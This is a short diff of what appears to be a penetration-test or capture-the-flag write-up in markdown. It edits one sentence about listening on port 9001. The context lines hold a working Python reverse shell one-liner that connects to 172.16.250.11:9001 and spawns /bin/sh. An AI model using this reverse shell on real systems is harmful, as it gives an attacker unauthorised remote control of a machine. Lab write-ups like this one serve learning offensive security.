@@ -243,7 +243,7 @@ We use this reverse Shell written in Python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.250.11",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
 ```
 
-And finally we will be listening to the port we have selected. In this case the port 9001
+And finally we will be listening to the port we have selected. In this case the port 9001. We can see that we belong to another network interface 
 ![[Pasted image 20250512162449.png]]
 
 # Credential leak
